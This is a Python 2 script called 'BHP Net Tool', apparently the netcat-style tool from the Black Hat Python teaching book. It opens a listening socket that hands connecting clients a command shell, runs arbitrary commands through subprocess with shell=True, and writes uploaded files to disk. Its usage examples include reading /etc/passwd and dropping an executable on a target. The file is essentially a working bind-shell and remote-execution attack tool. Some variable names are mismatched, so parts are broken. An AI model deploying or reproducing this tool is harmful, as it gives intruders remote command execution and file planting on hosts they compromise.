#!/usr/bin/python

import sys
import socket
import getopt
import threading
import subprocess

# define golbal variabels
listen 		= False
command 	= False
upload		= False
execute		= ""
target 		= ""
upload_dest	= ""
port		= 0

def usage():
	print "BHP Net Tool"
	print
	print "Usage: bhpnet.py -t target_host -p port"
	print "-l --listen - listen on [host]:[port] for incoming connections"
	print "-e --execute=file_to_run - execute the given file upon receiving a connection"
	print "-c --command - initialize a command shell"
	print "-u --upload=destination - upon receiving connection upload a file and write to [destination]"
	print
	print
	print "Examples: "
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
	print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
	sys.exit(0)
	
def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		# connect to our target host
		client.connect((target, port))
		
		if len(buffer):
			client.send(buffer)
		
		while True:
			# wait for data back
			recv_ln = 1
			response = ""
			
			while recv_ln:
				data = client.recv(4096)
				recv_ln = len(data)
				response += data
				
				if recv_ln < 4096:
					break
					
			print response,
			
			# wait for input
			buffer = raw_input("")
			buffer += "\n"
			client.send(buffer)
			
	except:
		print "[*] Exception. Exiting."
		client.close()
		

def server_loop():
	global target
	
	# if no target listen to all interfaces
	if not len(target):
		target = "0.0.0.0"
	
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	
	server.listen(5)
	print "[*] Listen on %s:%d" % (target, port)
	
	while True:
		client_socket, addr = server.accept()
		
		client_thread = threading.Thread(target=client_handler,args=(client_socket,))
		client_thread.start()
		
def run_command(command):
	# trim the newline
	command = command.rstrip()
	
	# run the command and get output back
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"
		
	return output
	
def client_handler(client_socket):
	global upload
	global execute
	global command
	
	# check for upload
	if len(upload_dest):
			# read in all bytes and wirte to our destination
			file_buffer = ""
			
			# keep reading until none is available
			while True:
				data = client_socket.recv(1024)
				
				if not data:
					break
				else:
					file_buffer += data
			# now we take these bytes and try to write them
			try:
				file_descriptor = open(upload_destination,"wb")
				file_descriptor.write(file_buffer)
				file_descriptor.close()
				
				#acknowledge that we wrote that file out
				client_socket.send("Successfully saved file to %s\r\n" % upload_dest)
			except:
				client_socket.send("Failed to save file to %s\r\n" & upload_dest)
			
	# check for command execution
	if len(execute):
		ouput = run_command(execute)
		client_socket.send(output)
	
	#if command shell
	if command:
		while True:
			#show simple promt
			client_socket.send("<NETCAT:#> ")
			
			# recive until linefeed
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
				
			# send back the cmd oupout
			print "Execute Command : %s" % cmd_buffer.rstrip()
			response = run_command(cmd_buffer)
			
			#send back the response
			client_socket.send(response)
			print cmd_buffer
				
def main():
	global listen
	global port
	global execute
	global command
	global uplodad_destination
	global target

	if not len(sys.argv[1:]):
		usage()
	
	# read commandline options
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()
		
	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--command"):
			command = True
		elif o in ("-u", "--upload"):
			upload_dest = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False,"UnhandledOption"
			
	# are we going to listen or just send data from stdin?
	if not listen and len(target) and port > 0:
		# read in the buffer from commandline
		# this will block so send CTR-D if not sending input to stdin
		buffer = sys.stdin.read()
		
		# send data to client
		client_sender(buffer)
		
	# we are going to listen and potentially
	# upload things, execute commands, and drop a shell back
	# depending on our command line options above
	if listen:
		server_loop()
	
main()
			
